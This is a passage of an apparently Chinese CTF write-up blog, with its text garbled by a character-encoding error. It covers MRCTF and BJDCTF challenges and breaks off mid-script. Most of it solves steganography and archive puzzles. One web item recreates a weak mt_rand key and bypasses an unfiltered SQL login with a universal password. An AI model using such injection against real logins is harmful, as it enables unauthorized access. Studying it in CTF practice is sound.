<span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br><span class="line"><span class="keyword">echo</span> $Public_key = public_key();</span><br><span class="line"><span class="keyword">echo</span> $a = private_key();</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ç§é’¥ï¼šXuNhoueCDCGc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>ç”¨æˆ·åæ— æ‰€è°“ï¼Œpasswordæ²¡è¿‡æ»¤ï¼Œä¸‡èƒ½å¯†ç ï¼Œç§é’¥è¾“è¿›å»</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç™»å½•å¾—åˆ°flag</p>
<h3 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h3><p>ä¸€ä¸ªå¤æ‚çš„ååºåˆ—åŒ–ï¼Œå¾…è¡¥å……</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cyberpunk"><a href="#Cyberpunk" class="headerlink" title="Cyberpunk"></a>Cyberpunk</h3><p>å½“æ—¶è¿˜ä»¥ä¸ºè¦é€†å‘â€¦..è·‘ç¨‹åºä¹‹å‰ï¼Œæ”¹ä¸€ä¸‹ç”µè„‘æ—¥æœŸå°±å¯</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/13.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><p>æ”¹ä¸€ä¸‹pngé«˜åº¦</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/14.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"><a href="#ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—" class="headerlink" title="ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—"></a>ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—</h3><p>æ”¹æ–‡ä»¶å¤´ã€éšè—æ–‡å­—ã€éŸ³ç¬¦è§£ç </p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/15.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="å¯»æ‰¾xxx"><a href="#å¯»æ‰¾xxx" class="headerlink" title="å¯»æ‰¾xxx"></a>å¯»æ‰¾xxx</h3><p><a href="https://www.btis.site/2020/03/09/xctf-misc-wp/#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF">ç”µè¯éŸ³</a>+å¾®ä¿¡å…¬ä¼—å·ï¼ˆæƒ³æŠ¢1è¡€çš„æ²¡çŒœåˆ°å…¬ä¼—å·â€¦â€¦</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/16.jpg" src="/img/loading.gif" class="lazyload"></a>

<h3 id="æ‘‡æ»šDJ"><a href="#æ‘‡æ»šDJ" class="headerlink" title="æ‘‡æ»šDJ"></a>æ‘‡æ»šDJ</h3><p>æ— çº¿ç”µè½¬å›¾ç‰‡ï¼ˆ<a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/17.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="åƒå±‚å¥—è·¯"><a href="#åƒå±‚å¥—è·¯" class="headerlink" title="åƒå±‚å¥—è·¯"></a>åƒå±‚å¥—è·¯</h3><p>è„šæœ¬å¼€å‹ç¼©åŒ…ã€RGBè½¬äºŒç»´ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.zip ]; <span class="keyword">do</span></span><br><span class="line">  files=*.zip;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>â€¦ "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">200</span>    <span class="comment">#xåæ ‡  é€šè¿‡å¯¹txté‡Œçš„è¡Œæ•°è¿›è¡Œæ•´æ•°åˆ†è§£</span></span><br><span class="line">y = <span class="number">200</span>    <span class="comment">#yåæ ‡  x * y = è¡Œæ•°</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>, (x, y))   <span class="comment">#åˆ›å»ºå›¾ç‰‡</span></span><br><span class="line">file = open(<span class="string">'qr.txt'</span>)    <span class="comment">#æ‰“å¼€rgbå€¼çš„æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šè¿‡æ¯ä¸ªrgbç‚¹ç”Ÿæˆå›¾ç‰‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = file.readline()  <span class="comment">#è·å–ä¸€è¡Œçš„rgbå€¼</span></span><br><span class="line">        rgb = line.split(<span class="string">", "</span>)  <span class="comment">#åˆ†ç¦»rgbï¼Œæ–‡æœ¬ä¸­é€—å·åé¢æœ‰ç©ºæ ¼</span></span><br><span class="line">        im.putpixel((i, j), (int(rgb[<span class="number">0</span>]), int(rgb[<span class="number">1</span>]), int(rgb[<span class="number">2</span>])))    <span class="comment">#å°†rgbè½¬åŒ–ä¸ºåƒç´ </span></span><br><span class="line"></span><br><span class="line">im.show()   <span class="comment">#ä¹Ÿå¯ç”¨im.save('flag.jpg')ä¿å­˜ä¸‹æ¥</span></span><br></pre></td></tr></table></figure></div>

<h3 id="ä¸çœ ä¹‹å¤œ"><a href="#ä¸çœ ä¹‹å¤œ" class="headerlink" title="ä¸çœ ä¹‹å¤œ"></a>ä¸çœ ä¹‹å¤œ</h3><p>montage+gapsï¼ˆæˆ–è€…æ‰‹æ‹¼</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg</span><br><span class="line">gaps --image=out.jpg --generations=40 --population=120 --size=100</span><br></pre></td></tr></table></figure></div>

<p>å…ˆåˆå¹¶åç”¨<a href="https://blog.csdn.net/uwr44uouqcnsuqb60zk2/article/details/78516605" target="_blank" rel="noopener">gaps</a>æ‹¼å›¾</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/18.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="pyFlag"><a href="#pyFlag" class="headerlink" title="pyFlag"></a>pyFlag</h3><p>ä¸‰ä¸ªç…§ç‰‡é‡Œå¤šä½™ä¿¡æ¯æ‹¼æˆä¸€ä¸ªæ–°çš„zipã€çˆ†ç ´zipå¯†ç  1234ã€base85 16 32 16 64</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/21.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel"></a>Unravel</h3><p>foremostã€aesã€silenteye</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/19.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/20.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_misc"></a>Hello_misc</h3><p>foremostã€red_plane0åˆ†ç¦»ã€ttlã€äºŒè¿›åˆ¶è½¬asciiã€zipè½¬docã€éšè—æ–‡å­—ã€base64ã€æŸ¥æ‰¾æ˜¾è‰²</p>
<p>é¢„æœŸè·‘red_planeçš„è„šæœ¬ï¼ˆè½¬è‡ª<a href="http://www.ga1axy.top/index.php/archives/13/#hellomiscworldï¼" target="_blank" rel="noopener">ga1xy</a>å¸ˆå‚…ï¼‰</p>
<p>å‡ºé¢˜ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.png'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bitcon = bitstring.Bits(f)</span><br><span class="line">    im = Image.new(<span class="string">'RGB'</span>,(<span class="number">1024</span>,<span class="number">780</span>),(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    pim = im.load()</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> enumerate(bitcon.bin):</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">'0'</span>:</span><br><span class="line">            pim[i%<span class="number">1024</span>,i/<span class="number">1024</span>] = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>)</span><br><span class="line">    im.save(<span class="string">'red_blue.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>è§£é¢˜ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> bitstring</span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">'try to restore it.png'</span>)</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">pim = im.load() <span class="comment"># è¯»å–å›¾ç‰‡çš„åƒç´ ä¿¡æ¯</span></span><br><span class="line">bin_result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> range(height):</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> range(width):</span><br><span class="line">        <span class="keyword">if</span> pim[w,h][<span class="number">0</span>] == <span class="number">255</span>: <span class="comment"># åˆ¤æ–­æ˜¯å¦æ˜¯çº¢è‰²ï¼ˆR,G,Bï¼‰[0]è¡¨ç¤ºç¬¬ä¸€é€šé“</span></span><br><span class="line">            bin_result += <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bin_result += <span class="string">'0'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print bitstring.BitArray(bin=bin_result).bytes.encode('hex')</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'result.png'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bitstring.BitArray(bin=bin_result).bytes)</span><br></pre></td></tr></table></figure></div>

<p>éé¢„æœŸï¼šç›´æ¥æŸ¥çœ‹red_plane0é€šé“ï¼ŒSave Bin</p>
<p>ttlè§£å¯†è„šæœ¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i[<span class="number">0</span>:]))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line"> result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/22.png" src="/img/loading.gif" class="lazyload"></a>

<p>è§£å¼€åçœ‹zipç»„æˆï¼ŒçŸ¥é“æ˜¯ä¸ªdocæˆ–è€…docxï¼Œæ”¹åç¼€ï¼Œå°†ä¸‹é¢çš„ç™½è‰²å­—ä½“å˜è‰²ï¼Œbase64è§£ç åå¾—åˆ°0 1å­—ç¬¦ä¸²</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/23.png" src="/img/loading.gif" class="lazyload"></a>

<p>æœç´¢0ï¼Œè§‚å¯Ÿä¸€ä¸‹ï¼Œå¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF-2nd-wp</title>
    <url>/2020/03/21/BJDCTF-2nd-wp/</url>
    <content><![CDATA[<p>ä¸Šå‘¨å…­ï¼Œç¬¬äºŒå±ŠBJDåœ¨buuojä¸Šä¸¾è¡Œäº†ï¼Œå»æ°´äº†ä¸€ä¸‹ï¼Œåœ¨è¿™é‡Œå†™ä¸€äº›miscå’Œcryptoçš„wpå§ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯webåŸºæœ¬ä¸ä¼š</p>
<p>&nbsp;</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æœ€ç®€å•çš„misc-y1ng"><a href="#æœ€ç®€å•çš„misc-y1ng" class="headerlink" title="æœ€ç®€å•çš„misc-y1ng"></a>æœ€ç®€å•çš„misc-y1ng</h3><p>æ€è·¯ï¼šä¼ªåŠ å¯†+è¡¥å…¨æ–‡ä»¶å¤´+16è¿›åˆ¶è½¬ASCII</p>
<p>09-&gt;00ï¼Œè¡¥å…¨æ–‡ä»¶å¤´89 50 4E 47ï¼Œå¾—åˆ°ä¸‹å›¾</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>å°†ä¸‹é¢é‚£ä¸€è¡Œè½¬æ¢ä¸ºASCIIåå¾—åˆ°flagï¼š<code>BJD{y1ngzuishuai}</code></p>
<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>æ€è·¯ï¼špngé«˜åº¦ä¿®æ”¹</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¼€å§‹æ²¡æƒ³ä¿®æ”¹é«˜åº¦ï¼Œç›´æ¥æ”¾åˆ°sloveräº†å•¥ä¹Ÿæ²¡å‘ç°ï¼Œç„¶åç”¨zstegæ²¡æ³•å‘ç°éšå†™ï¼Œæœ€åå»æ”¹äº†é«˜åº¦</p>
<p>å¾—åˆ°flagï¼š<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>æ€è·¯ï¼šforemoståˆ†ç¦»+æ”¹æ–‡ä»¶æ ¼å¼+è§†é¢‘é€å¸§+äºŒç»´ç åè‰²+16è¿›åˆ¶è½¬ASCII</p>
<p>foremoståˆ†ç¦»å‡ºäº†ä¸€ä¸ªzipï¼Œè§£å‹å¾—åˆ°ä¸€ä¸ªjpgï¼Œæ ¼å¼ä¸æ­£ç¡®ï¼Œfileä¸€ä¸‹å‘ç°æ˜¯aviï¼Œæ”¹åç¼€</p>
<p>è¿‘æœŸé’‰é’‰â€œæ±‚é¥¶â€è§†é¢‘ï¼Œä½†æ˜¯é‡Œé¢æ··è¿›å»ä¸€äº›å›¾ç‰‡ï¼Œprï¼Œaeï¼Œffä¸ä¼šç”¨ã€‚ã€‚ï¼ˆæ‰€ä»¥æˆ‘é€‰æ‹©è¿…é›·</p>
<p>é€å¸§æŸ¥çœ‹åå‘ç°å››å¼ å›¾ç‰‡(éƒ½æ˜¯å‡ºé¢˜äººâ€¦</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>å‰ä¸‰å¼ åè‰²å®Œï¼Œè¦ä¸PsQREditï¼Œè¦ä¸Barcode Readeréƒ½èƒ½æ‰«å‡ºæ¥</p>
<p>ä½†æ˜¯ç¬¬4å¼ ä¸­é—´æœ‰ã€ç³Šï¼Œäºæ˜¯æå‡ºQRazyBoxè‡ªå·±æ‹¼äº†ä¸€å¼ </p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>æœ€åæŠŠæ‰«å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¼èµ·æ¥å¾—åˆ°<code>6167696E5F6C  6F76655F59  424A447B696D  316E677D</code></p>
<p>16è¿›åˆ¶è½¬ASCIIåè°ƒæ•´ä¸€ä¸‹é¡ºåºå¾—åˆ°flagï¼š<code>BJD{imagin_love_Y1ng}</code></p>
<h3 id="å°å§å§-y1ng"><a href="#å°å§å§-y1ng" class="headerlink" title="å°å§å§-y1ng"></a>å°å§å§-y1ng</h3><p>æ€è·¯ï¼šç›´æ¥010é‡ŒæœBJD</p>
<p>u1s1ï¼Œå›¾ä¸é”™ï¼Œè¿™é¢˜å¡äº†åŠå¤©</p>
<p>åˆšå¼€å§‹æ‹¿stegdetectåˆ†æäº†ä¸€ä¸‹ï¼Œä»¥ä¸ºæ˜¯jphideã€‚ã€‚ç„¶åå› ä¸ºä¸çŸ¥é“å¯†ç æ˜¯å•¥å°±ä¸€ç›´å¡ä½äº†ï¼Œbreakçˆ†ç ´ä¹Ÿçˆ†ä¸å‡ºæ¥</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>æœ€åå»010é‡Œé¢æœäº†ä¸€ä¸‹BJDã€‚ã€‚ï¼ˆäººå‚»äº†</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°flagï¼š<code>BJD{haokanma_xjj}</code></p>
<h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h3><p>æ€è·¯ï¼š010é‡Œé¢çœ‹flagå½¢çŠ¶ï¼ˆæŠ½è±¡å¸¦å¸ˆã€‚ã€‚</p>
<p>æ‰“å¼€010ï¼Œå¾€ä¸‹æ‹‰</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°flagï¼š<code>BJD{572154976}</code></p>
<h3 id="åœ£ç«æ˜­æ˜­-y1ng"><a href="#åœ£ç«æ˜­æ˜­-y1ng" class="headerlink" title="åœ£ç«æ˜­æ˜­-y1ng"></a>åœ£ç«æ˜­æ˜­-y1ng</h3><p>æ€è·¯ï¼šæ–°ä½›æ›°+outguesséšå†™</p>
<p>çœ‹å±æ€§å‘ç°æ–°ä½›æ›°ï¼Œ<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">è§£ç </a>ä¸€ä¸‹ï¼ˆå¾—åˆ°keyï¼šgemloveï¼Œé¢˜ç›®æç¤ºå»æ‰com</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç„¶åæ ¹æ®é¢˜ç›®hintï¼š<code>å¼€å±€ä¸€å¼ å›¾ï¼Œflagå…¨é çŒœ</code>     æš—ç¤ºoutguesséšå†™</p>
<p>å…¶å®åˆšå¼€å§‹æˆ‘æ²¡ç†è§£è¿™æ„æ€ï¼Œç„¶åç”¨stegdetectæ‰«<code>error: Quantization table 0x00 was not defined</code></p>
<p>æ‰“å¼€010çœ‹ä¸€ä¸‹ï¼Œå‘ç°å¤§é‡00ï¼Œ20æ˜ç¤ºoutguesséšå†™</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/12.png" src="/img/loading.gif" class="lazyload"></a>

<p>è§£å‡ºæ¥å¾—åˆ°flagï¼š<code>BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></p>
<h3 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h3><p>æ€è·¯ï¼šæ–‡ä»¶åä¸ºå‹ç¼©åŒ…å¯†ç ï¼Œå¤šå±‚å‹ç¼©åŒ…è§£å¯†</p>
<p>è¿™é¢˜æ˜¯ç»™æ–°ç”Ÿçš„ï¼Ÿï¼Ÿè®°å¾—å‰ä¸€é˜µå­è·Ÿæ¥ å­å“¥å»æ°´Sarctfçš„æ—¶å€™å°±é‡åˆ°è¿‡è¿™bé¢˜ï¼Œå½“æ—¶æ‹†è‡ªé—­äº†ï¼Œåæ¥ä¹Ÿæ²¡ç®¡</p>
<p>çœ‹ä¸€äº†çœ¼å‡ºé¢˜äººï¼Œå»<a href="https://www.gem-love.com/ctf/1471.html" target="_blank" rel="noopener">å¸ˆå‚…åšå®¢</a>ç…äº†ç…ï¼Œæœç„¶æ‰“Sarctfäº†ã€‚ã€‚å½“æ—¶çš„æ˜¯æ— åç¼€zip</p>
<p>è¿™æ³¢æ˜¯æœ‰åç¼€.tar.gzï¼Œå‘ç°è„šæœ¬ï¼Œæƒ³æ”¹æ”¹ï¼Œå‘ç°è‡ªå·±ä¸ä¼šæ”¹ã€‚ã€‚</p>
<p>è´´ä¸€ä¸‹ç¾¤é‡ŒOrgeå¸ˆå‚…çš„bashè„šæœ¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.tar.gz ]; <span class="keyword">do</span></span><br><span class="line">  files=*.tar.gz;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>â€¦ "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span 